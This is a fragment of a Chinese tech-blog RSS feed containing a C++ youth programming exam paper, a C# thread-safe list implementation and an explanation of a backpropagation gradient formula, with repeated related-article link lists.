      <description>首页编程日记开发工具嵌入式服务器运维青少年编程能力等级测评CPA C++五级试卷（1）news/2025/10/31 23:18:57/青少年编程能力等级测评CPA C++五级试卷（1）一、单项选择题（共15题，每题3分，共45分）CP5_1_1.下列有关类的重用意义的叙述中，不正确的是（  ）。A．类的重用有利于代码结构的维护B．类的重用有利于减少代码的冗余C．类的重用有利于提升程序的执行效率D．类的重用有利于提升程序的可扩展性和灵活性CP5_1_2．类的组合，其核心特征是(  )。A．一个类内嵌其他类作为成员B．一个类内嵌其他类的私有成员作为成员C．一个类内嵌其他类的保护成员作为成员D．一个类内嵌其他类的对象作为成员CP5_1_3．执行下列代码，输出结果是（  ）。#include &lt;iostream&gt;using namespace std;class Point {public:Point(int a) :x(a+1) {};void print() {cout &lt;&lt; "x:" &lt;&lt; x &lt;&lt;" ";}private:int x;};Point&amp; re_p(int a) {Point* res = new Point(a+1);res-&gt;print();return *res;}int main(){Point&amp; a = re_p(2);a.print();return 0;}A．x:2 x:2B．x:2 x:3C．x:3 x:4D．x:4 x:4CP5_1_4．执行下列代码，输出结果是（  ）。#include &lt;iostream&gt;using namespace std;class B;class A {public:char ia;A() {ia = 'A';}B *b;};class B {public:char ib;B() {ib = 'B';}A oa;};int main() {A t1;t1.b = new B();B t2;cout &lt;&lt; t1.ia &lt;&lt;t1.b-&gt;ib;cout &lt;&lt; t2.ib&lt;&lt;t2.oa.ia&lt;&lt;endl;return 0;}A.ABBAB.AABBC.BBAAD.BAABCP5_1_5．在C++中，类的默认继承方式是（   ）。A．公有继承B．私有继承C．保护继承D．多态继承CP5_1_6．执行下列代码，输出结果是（  ）。#include &lt;iostream&gt;using namespace std;class Person{public:void Print(){cout&lt;&lt;'P';}void Output(){cout&lt;&lt;1;}virtual ~Person(){cout&lt;&lt;3; }};class Tom:public Person{public:void Print(){cout&lt;&lt;'T';}};int main(){Tom a;a.Output();a.Print();return 0;}A．1TB．1PC．1T3D．1P3CP5_1_7．在公有继承的情况下，允许派生类中新定义的成员函数直接访问的基类成员是（）。A．公有成员和保护成员B．公有成员C．保护成员和私有成员D．公有成员、保护成员和私有成员CP5_1_8．有如下类的声明，则在创建一个类 C 的对象时，输出的信息是（ ）。class A{public:A(){ cout&lt;&lt;'A';}};class B{public:B(){ cout&lt;&lt;'B';}A aa;};class C:public B{public:C(){ cout&lt;&lt;'C'; }};A．ABCB．BACC．BCAD．CBACP5_1_9．C++要实现运行时多态性，需使用的是（   ）。A．构造函数B．析构函数C．虚函数D．重载函数CP5_1_10．有如下类声明，则下列叙述正确的是（  ）。class A{public:virtual void fun1(){}void fun2(){}};class B:public A{public:virtual void fun2(){cout &lt;&lt;"fun2";}void fun1(){cout&lt;&lt;"fun1";}};A. A::fun2()和B::fun1()都不是虚函数B.A::fun2()和B::fun1()都是虚函数C. A::fun2()是虚函数，而B::fun1()不是虚函数D. A::fun2()不是虚函数，而B::fun1()是虚函数CP5_1_11．下列关于模板的叙述中，错误的是（  ）。A．模板形参只能由关键字 typename 声明B．函数模板中可能含有虚拟类型参数C．类模板的成员函数都是模板函数D．满足一定条件时可以省略模板实参CP5_1_12．下列代码是函数模板声明及变量定义，则下列调用语句错误的是（  ）。template &lt;class T1, class T2, class T3&gt; T1 sum(T2,T3);double d1,d2;A．sum&lt;double,double&gt;(d1,d2);B．sum&lt;double&gt;(d1,d2);C．sum&lt;double,double,double&gt;(d1,d2);D．sum(d1,d2);CP5_1_13．下列有关类模板的叙述中，错误的是（  ）。A.类模板的成员函数都是函数模板,类模板实例化后,成员函数也随之实例化B.可以为类模板参数设置默认值C.类模板描述了一组类D.一个类模板中只允许有一个类型参数CP5_1_14．运行下列代码，若能够输出3.8，则/**(1)**/处应填写的语句是（ ）。#include&lt;iostream&gt;using namespace std;template &lt;class T&gt;class A{private:T a1,a2;public:A(T aa1,T aa2){a1=aa1;a2=aa2;}T add(){T sum;sum=a1+a2;return sum;}};int main(){/**(1)**/cout&lt;&lt;a.add()&lt;&lt;endl;return 0;}A. A a(1.5,2.3);B. A&lt;double&gt; a(1.5,2.3);C. &lt;double&gt; A a(1.5,2.3);D. double A a(1.5,2.3);CP5_1_15．STL引入C++后，新增的编程模式是（   ）。A．泛型程序设计B．面向过程程序设计C．数据抽象程序设计D．面向对象程序设计二、多项选择题（共5题，每题2分，共10分）CP5_1_16．下列有关类的组合和继承的叙述中，正确的有（  ）。A．组合和继承都是类重用的实现方法之一B．类的组合，整体类自动获得局部类的全部接口C．类的继承，子类可自动继承父类的接口D．组合关系和继承均破坏了类的封装性CP5_1_17．下列有关派生类的叙述中，正确的有（  ）。A．一个派生类可以作为另一个派生类的基类B．派生类至少有一个基类C．派生类只继承了基类的公有成员和保护成员D．派生类默认的继承方式是privateCP5_1_18．执行下列代码，若输出结果为：“2023-3-20”，则/***code***/处可以填写的代码有（   ）。#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;class Date{protected:int day,month,year;public:Date(int day,int month,int year){this-&gt;day=day;this-&gt;month=month;this-&gt;year=year;}friend ostream&amp; operator&lt;&lt;(ostream &amp;os,const Date &amp;d);};ostream&amp; operator&lt;&lt;(ostream &amp;os,const Date &amp;d){cout&lt;&lt;d.year&lt;&lt;"-"&lt;&lt;d.month&lt;&lt;"-"&lt;&lt;d.day&lt;&lt;endl;return os;}int main(){/***code***/cout&lt;&lt;d&lt;&lt;endl;}A．string d="2023-3-20";B．string d="2023,3,20";C．Date d(20,3,2023);D．Date d(20.,3.,2020.);CP5_1_19．设有如下模板定义，则对func的调用，正确的有（  ）。Template &lt;class T&gt;T func(T x ,T y) {return x*x+y*y;}A. func(3,5)B. func&lt;&gt;(3,5)C. func(3,5.5)D. func&lt;int&gt;(3,5.5)CP5_1_20．下列基本容器，属于STL标准模板库中关联容器的有（  ）。A．双端队列B．集合C．单向链表D．映射三、编程题（共3题，每题15分，共45分）CP5_1_21．编写程序实现如下功能：通过定义组合类，输入平面直角坐标系上的一个坐标点（x,y），求该坐标点到坐标原点的距离。说明：（1）定义坐标点是Point类对象。使用Dis()函数获得坐标点到圆心的距离。点到圆心间的距离公式：。（2）编程过程中对于程序给定的部分不允许修改，考生仅允许在/****code****/提示行区间内作答。#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;class Point{                 //坐标点/*********code*********//************code***********/};class Distance{                      //坐标点到圆心的距离/***************code****************//****************code**************/private:Point t;  //组合类成员};int main(){float x,y;cin&gt;&gt;x&gt;&gt;y;Distance D;cout &lt;&lt; "Distance="&lt;&lt;D.Dis(x,y)&lt;&lt;endl;return 0;}样例1：输入：1  1输出：Distance=1.41421样例2：输入：-3 -4输出：Distance=5CP5_1_22．编写程序实现如下功能：输入圆的半径，求球体表面积及体积。球体看作由圆继承而来，定义圆类Circle作为基类，Sphere类为派生类。在派生类中对虚函数area()和volume()重新定义，求球体的表面积和体积。说明：（1）球体表面积=4*π*r2 ;  球体体积=4/3*（π*r3）。（2）编程过程中对于程序给定的部分不允许修改，考生仅允许在/****code****/提示行区间内作答。#include &lt;iostream&gt;using namespace std;const double PI=3.14;class Circle{//基类：定义一个数据成员radius作为半径，两个虚函数area()和volume()/************code************//****************code************/};class Sphere:public Circle{//派生类Sphere 求圆的表面积和体积/*************code****************//**************code****************/};int main(){double r;cin&gt;&gt;r;Sphere s(r);cout &lt;&lt;s.area() &lt;&lt; endl;cout &lt;&lt; s.volume() &lt;&lt; endl;return 0;}样例1：输入：1.0输出：12.564.18667样例2：输入：2.5输出：78.565.4167CP5_1_23．编写程序实现如下功能：通过编写函数模板，实现求解3个数值从小到大的排序。3个值可以是整型、浮点型或者字符型。说明：编程过程中对于程序给定的部分不允许修改，考生仅允许在/****code****/提示行区间内作答。#include &lt;iostream&gt;using namespace std;template &lt;class T&gt;/****************code****************//***************code*****************/int main(){int Int[3],m=0;char Char[4]="";double Double[3];//输入一个整数：1代表整数排序；2代表字符排序；3代表浮点数排序cin&gt;&gt;m;switch(m){case 1: cin&gt;&gt;Int[0]&gt;&gt;Int[1]&gt;&gt;Int[2];MinToMax(Int);break;case 2: cin&gt;&gt;Char[0]&gt;&gt;Char[1]&gt;&gt;Char[2];MinToMax(Char);break;case 3: cin&gt;&gt;Double[0]&gt;&gt;Double[1]&gt;&gt;Double[2];MinToMax(Double);break;default: return 0;}return 0;}样例1：输入：112 2 -9输出：-9 2 12样例2：输入：2D e C输出：C D e样例3：输入：32.3 4.5 1.2输出：1.2 2.3 4.5http://www.ppmy.cn/news/1540882.html相关文章C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:57 +0000</pubDate>
    </item>
    <item>
      <title>C# 中实现安全集合Concurrent 支持删除指定元素的</title>
      <link>https://www.ppmy.cn/news/1540881.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维C# 中实现安全集合Concurrent 支持删除指定元素的news/2025/10/31 23:18:56/ConcurrentBag实现了IProducerConsumerCollection接口，该接口主要用于生产者消费者模式下，可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类，实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类。ConcurrentBag对外提供的方法没有List那么多，但是同样有Enumerable实现的扩展方法。类本身提供的方法如下所示。名称 说明Add 将对象添加到 ConcurrentBag 中。CopyTo 从指定数组索引开始，将 ConcurrentBag 元素复制到现有的一维 Array 中。Equals(Object) 确定指定的 Object 是否等于当前的 Object。 （继承自 Object。）Finalize 允许对象在“垃圾回收”回收之前尝试释放资源并执行其他清理操作。 （继承自 Object。）GetEnumerator 返回循环访问 ConcurrentBag 的枚举器。GetHashCode 用作特定类型的哈希函数。 （继承自 Object。）GetType 获取当前实例的 Type。 （继承自 Object。）MemberwiseClone 创建当前 Object 的浅表副本。 （继承自 Object。）ToArray 将 ConcurrentBag 元素复制到新数组。ToString 返回表示当前对象的字符串。 （继承自 Object。）TryPeek 尝试从 ConcurrentBag 返回一个对象但不移除该对象。TryTake 尝试从 ConcurrentBag 中移除并返回对象。该官网提供集合，不支持删除指定对象，因此自己 使用list 和lock 实现线程安全 集合类型usingSystem.Collections;namespaceTestLib;publicclassConcurrentList&lt;T&gt;:IList&lt;T&gt;{privatereadonlyIList&lt;T&gt;_list=newList&lt;T&gt;();privatereadonlyReaderWriterLockSlim_lock=newReaderWriterLockSlim(LockRecursionPolicy.NoRecursion);publicConcurrentList(){}publicConcurrentList(List&lt;T&gt;values){_list=values;}privatevoidConcurrentAction(Action&lt;IList&lt;T&gt;&gt;action){ConcurrentAction(x=&gt;x.EnterWriteLock(),x=&gt;x.ExitWriteLock(),action);}privatevoidConcurrentAction(Action&lt;ReaderWriterLockSlim&gt;enter,Action&lt;ReaderWriterLockSlim&gt;exit,Action&lt;IList&lt;T&gt;&gt;action){try{enter(_lock);action(_list);}finally{exit(_lock);}}privateTResultConcurrentFunc&lt;TResult&gt;(Func&lt;IList&lt;T&gt;,TResult&gt;func)=&gt;ConcurrentFunc(x=&gt;x.EnterReadLock(),x=&gt;x.ExitReadLock(),func);privateTResultConcurrentFunc&lt;TResult&gt;(Action&lt;ReaderWriterLockSlim&gt;enter,Action&lt;ReaderWriterLockSlim&gt;exit,Func&lt;IList&lt;T&gt;,TResult&gt;func){try{enter(_lock);returnfunc(_list);}finally{exit(_lock);}}publicvoidAddRange(IEnumerable&lt;T&gt;values){ConcurrentAction(l=&gt;{foreach(varvalueinvalues){l.Add(value);}});}publicvoidAdd(Titem)=&gt;ConcurrentAction(l=&gt;l.Add(item));publicboolRemove(Titem)=&gt;ConcurrentFunc(l=&gt;l.Remove(item));publicvoidClear()=&gt;ConcurrentAction(l=&gt;l.Clear());publicboolContains(Titem)=&gt;ConcurrentFunc(l=&gt;l.Contains(item));publicvoidCopyTo(T[]array,intarrayIndex)=&gt;ConcurrentAction(l=&gt;l.CopyTo(array,arrayIndex));publicintCount=&gt;ConcurrentFunc(l=&gt;l.Count);publicboolIsReadOnly=&gt;ConcurrentFunc(l=&gt;l.IsReadOnly);publicintIndexOf(Titem)=&gt;ConcurrentFunc(l=&gt;l.IndexOf(item));publicvoidInsert(intindex,Titem)=&gt;ConcurrentAction(l=&gt;l.Insert(index,item));publicvoidRemoveAt(intindex)=&gt;ConcurrentAction(l=&gt;l.RemoveAt(index));publicTthis[intindex]{get=&gt;ConcurrentFunc(l=&gt;l[index]);set=&gt;ConcurrentAction(l=&gt;l[index]=value);}IEnumerator&lt;T&gt;IEnumerable&lt;T&gt;.GetEnumerator(){returnnewConcurrentEnumerator&lt;T&gt;(_list,_lock);}System.Collections.IEnumeratorSystem.Collections.IEnumerable.GetEnumerator(){returnnewConcurrentEnumerator&lt;T&gt;(_list,_lock);}}classConcurrentEnumerator&lt;T&gt;:System.Collections.Generic.IEnumerator&lt;T&gt;{privatereadonlyReaderWriterLockSlim_lock;privatereadonlyIEnumerator&lt;T&gt;_enumerator;internalConcurrentEnumerator(IEnumerable&lt;T&gt;target,ReaderWriterLockSlimlockSlim){_lock=lockSlim;_lock.EnterReadLock();_enumerator=target.GetEnumerator();}publicTCurrent=&gt;_enumerator.Current;publicboolMoveNext(){return_enumerator.MoveNext();}publicvoidReset(){_enumerator.Reset();}publicvoidDispose(){_lock.ExitReadLock();}objectIEnumerator.Current=&gt;Current;}http://www.ppmy.cn/news/1540881.html相关文章神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:56 +0000</pubDate>
    </item>
    <item>
      <title>神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度</title>
      <link>https://www.ppmy.cn/news/1540880.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度news/2025/10/31 23:18:55/本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式，单独拿出来做一下解释说明。公式 8-16是反向传播算法中，用于计算损失函数对隐藏层激活值a 1 a_1a1​的梯度。在反向传播过程中，损失函数对隐藏层激活值的梯度是非常重要的一步，因为它将误差从输出层传递到隐藏层，最终用于调整隐藏层的权重和偏置。公式 8-16 的表达式为：∂ L ∂ a 1 = ( a 2 − y ) w 2 (8-16) \frac{\partial L}{\partial a_1} = (a_2 - y) w_2 \tag{8-16}∂a1​∂L​=(a2​−y)w2​(8-16)1.公式中的符号解释L LL：损失函数，通常是交叉熵损失函数。a 1 a_1a1​：隐藏层的激活值，这是通过激活函数（如 sigmoid、ReLU）计算得到的隐藏层输出。a 2 a_2a2​：输出层的激活值，即模型的预测结果（通过输出层的激活函数计算得到）。w 2 w_2w2​：输出层权重矩阵，它连接隐藏层和输出层神经元。y yy：真实标签，表示样本的真实类别。∂ L ∂ a 1 \frac{\partial L}{\partial a_1}∂a1​∂L​：损失函数对隐藏层激活值的梯度，这个梯度用于进一步计算损失函数对隐藏层权重和偏置的影响。2.公式的含义公式 8-16 表示的是损失函数对隐藏层激活值a 1 a_1a1​的梯度。通过链式求导，损失函数对隐藏层的梯度可以通过输出层的误差a 2 − y a_2 - ya2​−y和输出层权重w 2 w_2w2​来计算。这个公式的推导与反向传播的链式法则密切相关，因为它需要将输出层的误差“反向传播”到隐藏层。3.推导过程为了推导公式 8-16，我们可以通过链式法则一步一步进行计算。1.链式法则的应用我们知道，损失函数L LL依赖于输出层的激活值a 2 a_2a2​，而输出层的激活值a 2 a_2a2​又依赖于隐藏层的激活值a 1 a_1a1​。根据链式法则，损失函数对隐藏层激活值a 1 a_1a1​的导数可以写为：∂ L ∂ a 1 = ∂ L ∂ z 2 ⋅ ∂ z 2 ∂ a 1 \frac{\partial L}{\partial a_1} = \frac{\partial L}{\partial z_2} \cdot \frac{\partial z_2}{\partial a_1}∂a1​∂L​=∂z2​∂L​⋅∂a1​∂z2​​其中：∂ L ∂ z 2 \frac{\partial L}{\partial z_2}∂z2​∂L​是损失函数对输出层加权输入z 2 z_2z2​的导数，表示的是输出层的误差。∂ z 2 ∂ a 1 \frac{\partial z_2}{\partial a_1}∂a1​∂z2​​是输出层加权输入z 2 z_2z2​对隐藏层激活值a 1 a_1a1​的导数。2.计算∂ z 2 ∂ a 1 \frac{\partial z_2}{\partial a_1}∂a1​∂z2​​输出层的加权输入z 2 z_2z2​是通过隐藏层激活值a 1 a_1a1​和输出层权重w 2 w_2w2​线性组合得到的，即：z 2 = w 2 ⋅ a 1 + b 2 z_2 = w_2 \cdot a_1 + b_2z2​=w2​⋅a1​+b2​因此，z 2 z_2z2​对a 1 a_1a1​的导数为：∂ z 2 ∂ a 1 = w 2 \frac{\partial z_2}{\partial a_1} = w_2∂a1​∂z2​​=w2​这意味着，输出层的加权输入z 2 z_2z2​对隐藏层的激活值a 1 a_1a1​的导数等于输出层的权重w 2 w_2w2​。3.计算∂ L ∂ z 2 \frac{\partial L}{\partial z_2}∂z2​∂L​根据公式 8-13，损失函数L LL对输出层加权输入z 2 z_2z2​的导数为：∂ L ∂ z 2 = a 2 − y \frac{\partial L}{\partial z_2} = a_2 - y∂z2​∂L​=a2​−y这个导数表示的是输出层的误差，即模型的预测值a 2 a_2a2​和真实标签y yy之间的差异。4.结合链式法则现在我们可以将这些结果代入链式法则，得到：∂ L ∂ a 1 = ( a 2 − y ) ⋅ w 2 \frac{\partial L}{\partial a_1} = (a_2 - y) \cdot w_2∂a1​∂L​=(a2​−y)⋅w2​这个结果表示，损失函数对隐藏层激活值a 1 a_1a1​的梯度等于输出层误差a 2 − y a_2 - ya2​−y和输出层权重w 2 w_2w2​的乘积。4.公式的解释公式 8-16 表明：损失函数对隐藏层激活值的梯度是通过输出层的误差和输出层权重反向传播回来的。输出层的误差a 2 − y a_2 - ya2​−y表示模型的预测结果与真实标签之间的差异。输出层的权重w 2 w_2w2​用于将这个误差传播回隐藏层，以调整隐藏层的输出。5.直观理解在反向传播中，输出层的误差a 2 − y a_2 - ya2​−y是最直接的反馈，它表示模型预测的结果和真实标签之间的偏差。这个误差通过输出层的权重w 2 w_2w2​反向传播到隐藏层，影响隐藏层的激活值a 1 a_1a1​的更新。如果输出层的误差较大，即a 2 a_2a2​和y yy的差异较大，那么损失函数对隐藏层激活值的梯度也会较大。这意味着隐藏层需要做出较大的调整来修正这个误差。如果输出层的误差较小，即a 2 a_2a2​和y yy非常接近，说明模型的预测较准确，隐藏层的梯度就会较小，表示隐藏层的输出已经接近于正确的值，不需要大幅度调整。通过公式 8-16，我们将输出层的误差传播回隐藏层，使得隐藏层能够感知到模型的整体误差，并相应地调整自身的输出。6.在反向传播中的作用公式 8-16 是反向传播算法中的关键一步。反向传播的基本思想是将输出层的误差逐层传递回去，最终传递到每一层的权重和偏置。这一步中的梯度∂ L ∂ a 1 \frac{\partial L}{\partial a_1}∂a1​∂L​用于进一步计算隐藏层的权重w 1 w_1w1​和偏置b 1 b_1b1​的梯度，从而调整隐藏层的参数。在反向传播的下一步，我们将根据这个梯度∂ L ∂ a 1 \frac{\partial L}{\partial a_1}∂a1​∂L​来计算隐藏层权重和偏置的更新。隐藏层的权重和偏置调整之后，模型的整体误差会减小，模型的预测精度逐渐提高。7.总结公式 8-16 通过链式法则，计算了损失函数对隐藏层激活值a 1 a_1a1​的梯度。这个梯度由输出层的误差a 2 − y a_2 - ya2​−y和输出层权重w 2 w_2w2​决定。通过这个公式，反向传播算法将误差从输出层传播到隐藏层，进而用于更新隐藏层的参数，最终使模型的整体误差减小，提高模型的预测性能。http://www.ppmy.cn/news/1540880.html相关文章基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
